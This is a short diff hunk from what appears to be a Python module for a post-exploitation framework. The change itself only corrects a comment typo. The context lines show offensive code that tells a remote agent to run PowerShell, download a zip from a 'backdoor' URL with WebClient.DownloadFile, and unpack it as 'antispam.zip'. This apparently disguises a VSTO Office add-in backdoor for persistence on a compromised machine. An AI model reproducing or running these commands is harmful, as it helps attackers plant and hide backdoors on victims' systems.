@@ -61,7 +61,7 @@ def run(API, agent_name, vsto_zip_backdoor_url):
     opts['command'] = "(New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')".format(vsto_zip_backdoor_url, outfile)
     API.agent_run_shell_cmd_with_result(agent_name, opts)
 
-    # unzip VSTO file; tried ClickOnce deployment over HTTP, refuse to work deal to trust issues
+    # unzip VSTO file; tried ClickOnce deployment over HTTP, refuse to work due to trust issues
     opts['command'] = "$zipfile = (new-object -com shell.application).NameSpace('{0}')\n \
                     $destination = (new-object -com shell.application).NameSpace('{1}')\n \
                     $destination.CopyHere($zipfile.Items(), 0x14)".format(outfile, outfile.replace('\\antispam.zip',''))
